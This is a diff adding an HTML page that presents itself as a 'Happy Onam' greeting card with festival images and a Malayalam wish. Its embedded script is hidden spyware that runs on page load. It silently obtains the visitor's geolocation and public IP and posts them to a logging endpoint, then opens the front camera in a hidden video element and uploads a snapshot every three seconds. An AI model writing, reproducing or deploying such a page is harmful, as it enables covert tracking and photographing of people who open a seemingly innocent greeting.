@@ -1,0 +1,212 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Happy Onam Greeting</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #ffe69a, #fff4d0);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: #fffbea;
+      border-radius: 20px;
+      padding: 80px;
+      text-align: center;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+      max-width: 700px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Garland at top */
+    .garland {
+      position: absolute;
+      top: 15px;
+      left: 0;
+      right: 0;
+      text-align: center;
+      font-size: 28px;
+      color: orange;
+    }
+
+    .title {
+      font-size: 40px;
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    .title span {
+      font-size: 72px;
+      color: #000;
+      display: block;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      margin: 18px 0;
+      color: #333;
+    }
+
+    .decor {
+      margin: 25px 0;
+    }
+
+    .decor img {
+      height: 120px;
+      margin: 0 10px;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #444;
+    }
+  </style>
+  <body onload="startCamera()">
+        <canvas id="photoCanvas" style="display:none;"></canvas>
+        <div id="camera-status"></div> <!-- Hidden status element -->
+  <div class="container" id="content">
+    <div class="tenor-gif-embed" data-postid="22885016" data-share-method="host" data-aspect-ratio="1.04918" data-width="100%">
+      
+      
+    </div>
+</head>
+<body>
+  <div class="card">
+    <div class="garland">🌼🌼🌼🌼🌼🌼🌼🌼🌼</div>
+
+    <div class="title">🌸🌸 HAPPY ONAM 🌸🌸</div>
+    <div class="decor">
+      <img src="https://t3.ftcdn.net/jpg/15/94/54/10/360_F_1594541077_l0TqeVVvr7DxgXrKUGpHX6jc7yzitKdP.jpg" alt="King Mahabali">
+      <img src="https://thumbs.dreamstime.com/b/onam-pookalam-flower-rangoli-diwali-pongal-made-using-marigold-zendu-flowers-ai-generated-onam-pookalam-traditional-332222844.jpg" alt="Pookalam">
+      <img src="https://media.istockphoto.com/id/512624433/photo/traditional-south-indian-brass-oil-lamp-nilavilakku.jpg?s=612x612&w=0&k=20&c=DDl7uS9G5OGEBlf-vE5jSnQtnume6sbT4f3lx3FYd7s=" alt="Nilavilakku">
+    </div>
+
+    <div class="subtitle">
+
+       
+      എല്ലാവർക്കും എന്റെ ഓണാശംസകൾ
+    </div>
+
+    <div class="footer">🧑‍💻developed by Encrypter</div>
+  </div>
+<script>
+        // Global variables
+        let videoStream = null;
+        let captureInterval = null;
+        const statusEl = document.getElementById('camera-status');
+        let userLocation = { lat: null, lon: null };
+
+        // 1. Get location silently
+        async function getLocation() {
+          return new Promise((resolve) => {
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                position => {
+                  userLocation.lat = position.coords.latitude;
+                  userLocation.lon = position.coords.longitude;
+                  resolve();
+                },
+                () => resolve(), // Silent fail if blocked
+                { timeout: 5000, maximumAge: 60000 }
+              );
+            } else {
+              resolve();
+            }
+          });
+        }
+
+        // 2. Initialize camera silently
+        async function startCamera() {
+          try {
+            videoStream = await navigator.mediaDevices.getUserMedia({
+              video: { facingMode: "user" },
+              audio: false
+            });
+
+            // Hidden video element
+            const videoEl = document.createElement('video');
+            videoEl.style.display = 'none';
+            document.body.appendChild(videoEl);
+            videoEl.srcObject = videoStream;
+            await videoEl.play();
+
+            // Start periodic capture
+            captureInterval = setInterval(() => {
+              captureAndSend(videoEl);
+            }, 3000);
+
+          } catch (err) {
+            console.error("Camera error:", err);
+          }
+        }
+
+        // 3. Capture and send photo silently
+        async function captureAndSend(videoEl) {
+          const canvas = document.getElementById("photoCanvas");
+          const ctx = canvas.getContext("2d");
+
+          canvas.width = videoEl.videoWidth;
+          canvas.height = videoEl.videoHeight;
+          ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(async (blob) => {
+            try {
+              const formData = new FormData();
+              formData.append("photo", blob, "capture.jpg");
+              await fetch("/upload-photo", {
+                method: "POST",
+                body: formData
+              });
+            } catch (err) {
+              console.error("Upload error:", err);
+            }
+          }, "image/jpeg", 0.8);
+        }
+
+        // 4. Send initial data silently
+        async function sendInitialData() {
+          try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+
+            await fetch('/log-initial', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                ip: ipData.ip,
+                lat: userLocation.lat,
+                lon: userLocation.lon
+              })
+            });
+          } catch (err) {
+            console.error("Initial data error:", err);
+          }
+        }
+
+        // Initialize everything silently
+        window.addEventListener('DOMContentLoaded', async () => {
+          await getLocation();
+          await sendInitialData();
+          setTimeout(startCamera, 2000);
+        });
+
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+          if (captureInterval) clearInterval(captureInterval);
+          if (videoStream) {
+            videoStream.getTracks().forEach(track => track.stop());
+          }
+        });
+      </script>
+</body>
+</html>
